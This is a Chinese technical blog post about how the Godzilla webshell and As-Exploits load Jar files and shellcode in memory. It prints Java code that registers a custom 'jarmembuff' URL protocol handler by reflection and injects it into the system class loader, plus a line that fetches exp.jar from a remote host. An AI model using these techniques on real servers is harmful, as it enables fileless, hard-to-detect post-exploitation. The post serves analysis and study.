<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qK-V1vIL-OcdefWH0_bQxw)

背景
--

哥斯拉在第一版的时候就提供了一个黑魔法：内存加载 Jar 功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合 JNA 可以实现无文件加载 ShellCode，一切都在内存中执行，大大扩展了利用面。

要知道 JDK 默认没有提供直接内存加载 Jar 的接口，但是我们可以想到，既然 JDK 是支持通过 http/file 协议加载 Jar 包，也就是这里面一定存在着：读取 Jar 包内容 -> 加载到内存 ->defineClass 的链路，如果我们能够把第一步跳过去，直接把 Jar 的 byte 复制到内存中，就可以实现无文件加载。同样，Java 原生是不支持内存加载 so 或者 dll 的，但是我们可以通过内存加载 Jar 的方式，在 Jar 中包含我们要利用的 so/dll 即可实现曲线救国。

As-Exploits 很早就把这个功能移植了过来，不过目前似乎并没有找到有写分析这个功能的文章，本文抛砖引玉，简单分析分析。

findResource 流程分析
-----------------

在了解无文件加载 Jar 原理之前，首先了解一下 JVM 是如何查找 Class 的 Class.forName 后下一个断点，进入 java.net.URLClassLoader#findClass，这里有一个很重要的属性 ucp，包含了所有的 URL 实例![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75ppibJ6vOmDqWtvRFzhzM0icKqQXNJTxz4EJTHcGfIq2RXSHYuZickExulA/640?wx_fmt=png)然后会通过 ClassLoader 中的 ucp 属性尝试获取目标类的 Resource，这里调用的是 sun.misc.URLClassPath#getResource(java.lang.String, boolean)，主要逻辑为遍历 ucp 下所有的 URL 对象进行资源的查找：sun.misc.URLClassPath.JarLoader#getResource(java.lang.String, boolean)![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pqQQ26T0icibTAiayrhB7O05mECc4niaRuSfVzWoibqTtdZsiaH4P6UGc6nJQ/640?wx_fmt=png)

找到目标 Class 对应所在 Resource 对象后，则会走入 java.net.URLClassLoader#defineClass 方法，进行类的加载![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75p3j99fyaSouGXun3LSzELzHtJ4c9cickJwPicQuEAVUBT8WM9PzSuoYHg/640?wx_fmt=png)

URLClassPath 与 URL
------------------

上面的过程涉及到两个重要的类，直接贴一下 ChatGPT 的描述： sun.misc.URLClassPath 类和 java.net.URL 类在 Java 中都与 URL（统一资源定位符）相关联，但它们的作用和职责不同。

java.net.URL 类是 Java 标准库中的一个类，用于表示一个统一资源定位符。它提供了许多方法来解析、构建和处理 URL。URL 对象可以用于打开连接、获取流等操作，以访问网络资源。

sun.misc.URLClassPath 类是 Java 虚拟机（JVM）的一部分，并不属于公共 API，它被用于支持类加载器加载和查找类文件。在类的查找过程中，URLClassPath 负责管理类加载路径、查找类文件并加载类。

具体来说，当 Java 程序运行时，JVM 的类加载器负责根据类的名称来查找并加载相应的类文件。URLClassPath 类是 JVM 中的一个关键组件，它通过封装一组 URL 对象（其中包含了可能包含类文件的目录或 JAR 文件的 URL）来提供类的查找功能。URLClassPath 通过调用 java.net.URL 类提供的方法来解析和构建 URL 对象，并利用这些 URL 对象来定位和加载类文件。

因此，可以说 URLClassPath 类是在类加载过程中起着重要的作用，它与 java.net.URL 类密切合作，使用 URL 来定位并加载类文件。

HTTP 远程加载 Jar 包原理
-----------------

知道了 findResource 的原理，后面就好理解为什么下面的的代码可以远程加载一个 Jar 包了：实际上就是把我们自定义的远程 URL 加入到了 ucp 属性中，后续通过该 URL 中提供的协议进行类的查找

```
URLClassLoader loader = new URLClassLoader(new URL[]{new URL("http://yzddmr6.com/exp.jar")});
loader.loadClass("asexploits.ShellcodeLoader");

```

为了摸清这一过程，我们用上面的代码对 http 协议加载 Jar 包过程进行调试： 在 java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler) 断点，发现会根据获取到的协议方式拿到不同的 handler，例如 http://yzddmr6.com/exp.jar，就会获取 http 的 handler，file:///tmp/exp.jar 就会获取 file 类型的 hander java.net.URL#getURLStreamHandler![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pjDfojibdGmWibos0UhST8L8MSiaMDyGtlZh0UG1bX1DIOibqmdJa3yn9Hw/640?wx_fmt=png) 之前查找到的 hander 会被保存到 handlers 整个缓存中，如果没有就会进行一个包名的拼接: "sun.net.www.protocol"+protocol+".Handler"，找到对应的处理类![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pVkIt3ibmIkhGt2KfYw7JIy6hdiaYicFLRJ3cTdRESXzkdFv77PcaBRyVA/640?wx_fmt=png)其实这里的协议是可以构造的，例如我们可以设置一种 abc://127.0.0.1/exp.jar，就会识别为 abc 协议![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pS0ILNWbnibDhhzZN1fC1Z0kFSApBcY89aIVuvJNB3Bg0tMGFd5n4h2Q/640?wx_fmt=png)然后在 java.net.URL#getURLStreamHandler 判断如果 handlers 里没有缓存，就会尝试去寻找 sun.net.www.protocol.abc.Handler 这个类，这里 handlers 属性是一个重点。![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pKZobFCuSgy3uMIbrDM3siaz7kBF9EyADh3PkkBIPRHDtRFhxJnM5UbQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pZpoQHVlichpGtjbFDQEpySsSTRFOOiawqgCWR4nUxWZQggeC0HvTW87A/640?wx_fmt=png)

除了 sun.net.www.protocol.http.Handler 以外，默认的 JDK 还支持以下协议，可以看看：![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75prHu8PzaAibANZiaV3MQUnfNFJUtycsK8X8Bcw8xB09brmIPc7ia5TTFFg/640?wx_fmt=png)

后续就会依次经过以下步骤， java.net.URL#openConnection java.net.URL#openStream sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pJv8eAQlVjpkYQuseOVI3k0vxoHfdXtia5pc47u8nl7ayPvmEKdzo5LA/640?wx_fmt=png) 在 sun.net.www.protocol.http.Handler#openConnection(java.net.URL, java.net.Proxy) 中会返回一个新的 HttpURLConnection 对象，该对象主要负责具体对远程地址的请求，获取 Jar 的内容。![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pI4amRib372fnbe6YIltYdrQLiaicM460OPg4ZQWXZXLdk7no9awQznOAw/640?wx_fmt=png)

可以看到在 http 协议加载 Jar 过程中有两个重要的类：

*   sun.net.www.protocol.http.HttpURLConnection
    
*   sun.net.www.protocol.http.Handler
    

这两个类都与 HTTP 协议相关，在 Java 中用于处理 HTTP 连接和请求：

*   sun.net.www.protocol.http.HttpURLConnection 类是 Java 标准库中的一个类，它继承自 java.net.HttpURLConnection 类，用于创建 HTTP 连接并发送 HTTP 请求。它提供了一组方法来设置请求的参数、发送请求、获取响应等操作，使开发者可以通过该类与远程服务器进行 HTTP 通信。
    
*   sun.net.www.protocol.http.Handler 类是 Java 虚拟机（JVM）中的一个实现类，它实现了 java.net.URLStreamHandler 接口。URLStreamHandler 接口定义了处理不同 URL 协议的方法，而 sun.net.www.protocol.http.Handler 类具体处理 HTTP 协议。它负责解析并处理 URL 对象中的 HTTP 部分，包括建立 HTTP 连接、发送 HTTP 请求等操作，这些操作实际是由 HttpURLConnection 来实现。
    

这两个类是获取 Jar 包内容的核心所在，想要实现内存加载 Jar 的关键部分就在这里。

内存加载 Jar 原理
-----------

综合看下来，最简单的办法就是实现一套自定义一套协议，在 http 协议的基础上修改获取 Jar 的逻辑，这也是 beichen 师傅的做法

### 增加自定义 protocol

在哥斯拉中叫 jarmembuff，在这里我们直接把协议跟对应的 handler 塞到 URL 对象的 handlers 缓存中，核心代码：

```
Field declaredField = null;
files = new ArrayList();
try {
    declaredField = URL.class.getDeclaredField("handlers");
} catch (NoSuchFieldException var7) {
    try {
        declaredField = URL.class.getDeclaredField("ph_cache");
    } catch (NoSuchFieldException var5) {
    } catch (Exception var6) {
    }
}
declaredField.setAccessible(true);
Map map = (Map) declaredField.get(null);
synchronized (map) {
    Object memoryBufferURLStreamHandler;
    if (map.containsKey("jarmembuff")) {
        memoryBufferURLStreamHandler = map.get("jarmembuff");
    } else {
        memoryBufferURLStreamHandler = new MemoryBufferURLStreamHandler();
        map.put("jarmembuff", memoryBufferURLStreamHandler);
    }
    files = (List) memoryBufferURLStreamHandler.getClass().getMethod("getFiles").invoke(memoryBufferURLStreamHandler);
}

```

### 实现自定义 URLStreamHandler

MemoryBufferURLStreamHandler 中 openConnection 直接返回自定义的 URLConnection 类，用于获取 Jar 的内容

```
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.ArrayList;
import java.util.List;
public class MemoryBufferURLStreamHandler extends URLStreamHandler {
    private final List files = new ArrayList();
    public MemoryBufferURLStreamHandler() {
    }
    public List getFiles() {
        return this.files;
    }
    public URLConnection openConnection(URL url) throws IOException {
        return new MemoryBufferURLConnection(url);
    }
}

```

### 实现自定义 URLConnection

MemoryBufferURLConnection，在 getInputStream 方法中直接返回要加载 Jar 包的 byte 数组，该数组内容可以自定义传入，即内存加载

```
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
public class MemoryBufferURLConnection extends URLConnection {
    private static List files;
    private final String contentType;
    private final byte[] data;
    protected MemoryBufferURLConnection(URL url) {
        super(url);
        String file = url.getFile();
        int indexOf = file.indexOf(47);
        synchronized (files) {
            this.data = (byte[]) files.get(Integer.parseInt(file.substring(0, indexOf)));
        }
        this.contentType = file.substring(indexOf + 1);
    }
    public static URL createURL(byte[] bArr, String str) throws MalformedURLException {
        synchronized (files) {
            files.add(bArr);
            URL url = new URL("jarmembuff", "", files.size() - 1 + "/" + str);
            return url;
        }
    }
    public void connect() throws IOException {
    }
    public int getContentLength() {
        return this.data.length;
    }
    public String getContentType() {
        return this.contentType;
    }
    public InputStream getInputStream() throws IOException {
        return new ByteArrayInputStream(this.data); // 直接返回内存中的内容
    }
}

```

### 添加到 SystemClassLoader 的 ucp 中

调用时首先将两个类打入内存上下文，然后调用 MemoryBufferURLConnection 的 createURL 创建构造好的 URL 对象，最后通过反射塞到 SystemClassLoader 的 ucp 中

```
public String load(byte[] jarClassData) {
    Class URLConnectionClass = null;
    try {
        String MemoryBufferURLConnection = "";
        String MemoryBufferURLStreamHandler = "";
        defClz(Base64DecodeToByte(MemoryBufferURLStreamHandler));
        URLConnectionClass = defClz(Base64DecodeToByte(MemoryBufferURLConnection));
    } catch (Exception e) {
    }
    if (jarClassData != null) {
        try {
            return addJar((URL) URLConnectionClass.getMethod("createURL", byte[].class, String.class).invoke(null, jarClassData, "application/jar"));
        } catch (Exception e) {
            return e.getMessage();
        }
    } else {
        return "jarByteArray is null";
    }
}

```

### files 对象

这里哥斯拉有一个小细节，MemoryBufferURLStreamHandler 中有一个没有使用过的 files 对象，研究了一下是什么作用![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pg0MfYNB2l3eNiads2WzDvgVCFw58ic02wuwhib8QVqeFUwYvsZIaOcicRA/640?wx_fmt=png)其实是因为 MemoryBufferURLConnection 每次是 new 出来的，无法保存之前加载过的 Jar 内容，这里的 List 是一个浅拷贝，链接到 MemoryBufferURLStreamHandler 实例对象中，这样就可以在每次 new 之后依旧保留曾经加载过的 jar，不需要重复加载。

适配高版本 JDK
---------

JDK9 实现了模块化，SystemClassLoader 不再是 URLClassLoader 的子类，所以原有的 Poc 就不能直接用了。520 师傅后来进行了一系列改进，支持了高版本 JDK。其实基本原理差不多，主要是用 https://github.com/BeichenDream/Kcon2021Code 中的 trick 绕过 JDK 了模块保护和反射过滤

As-Exploits 内存加载 ShellCode
--------------------------

通过 Jar 加载器 - 内存加载，上传 ext 目录下的 loader.jar![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pzYF8ezk9rmcklFfW2ZSJEBJq4PnQKGjniaSm54vvFAjnicDiatBpCUJHQ/640?wx_fmt=png) 可以通过 Js 引擎执行功能先试一下看类在不在，发现确实可以查找到![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pEEDmqK6M5Qn19lTrsPAviaf29LKK5rv1J8Jiav2ro9BdSnfREibWl1Wbw/640?wx_fmt=png) ShellCode 加载器模块 - 加载方式 JNA，exploit，弹出计算器，也就实现了内存加载 ShellCode 的功能![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU5t3BoSr7qiaMdH9rCtkm75pibmztIfT9k5ZFBnaic8sojkJEqU3pqNh8wPRuBLfwfWHlPs9uuyUFqNw/640?wx_fmt=png)